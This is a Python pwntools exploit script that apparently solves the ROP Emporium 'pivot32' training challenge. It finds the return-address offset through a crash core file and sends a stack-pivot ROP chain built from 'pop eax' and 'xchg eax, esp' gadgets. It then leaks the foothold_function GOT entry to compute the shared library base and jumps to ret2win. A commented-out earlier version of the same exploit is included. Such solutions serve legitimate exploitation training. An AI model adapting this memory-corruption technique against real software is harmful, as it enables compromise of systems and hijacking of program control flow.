from pwn import *
import binascii
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './pivot32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', 'a')
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))

print_file = 0x80483d0
data = 0x0804a018

elf_puts_plt = elf.plt.puts
elf_fh_plt = elf.plt.foothold_function
elf_fh_got = elf.got.foothold_function
xchg_eax_esp = 0x0804882e
pop_eax = 0x0804882c

payload_1 = flat(
elf_fh_plt,
elf_puts_plt,
elf.symbols.main,
elf_fh_got
)

io = start()

'''
# VERSION 1 OF EXPLOIT
pivot_addr = int(re.search(r"(0x[\w\d]+)", io.recvS()).group(0), 16)

payload_2 = flat(
asm('nop') * eip_offset,
pop_eax,
pivot_addr,
xchg_eax_esp,
)

io.sendline(payload_1)
io.sendlineafter('> ', payload_2)
#io.interactive() # use this and observe the state of program after you return back to main. Realise that you only need to send the stack smash
io.recvlines(2) # first 2 lines are not important, just logs

#leaked_address = io.recv()
leaked_address = io.recvlines(1)[0]

foothold_leak = unpack(leaked_address[:4].strip())
library_base = foothold_leak - 0x77d
ret2win = library_base + 0x974

exploit = flat(
asm('nop') * eip_offset,
ret2win
) 
'''


# VERSION 2 OF EXPLOIT
io.recvuntil("Call ret2win() from libpivot")
pivot_addr = io.recvline_contains(b"The Old Gods kindly bestow upon you a place to pivot:").strip().rsplit(b' ', 1)[1]
pivot_addr = u32(unhex(pivot_addr[2:]), endian='big')
payload_2 = flat(
asm('nop') * eip_offset,
pop_eax,
pivot_addr,
xchg_eax_esp,
)
io.sendline(payload_1)
io.sendlineafter('> ', payload_2)
data = io.recvline(1)
data = io.recvline(1)
data = io.recvline(1)
data = io.recvline(1)
data = io.recvline(1)
leaked_address = io.recvline(1)
foothold_leak = unpack(leaked_address[:4].strip())
library_base = foothold_leak - 0x77d
ret2win = library_base + 0x974
exploit = flat(
asm('nop') * eip_offset,
ret2win
)


io.sendlineafter('>', exploit)
#io.sendline(exploit) # can be used with either
return_data = io.clean()
print(return_data)

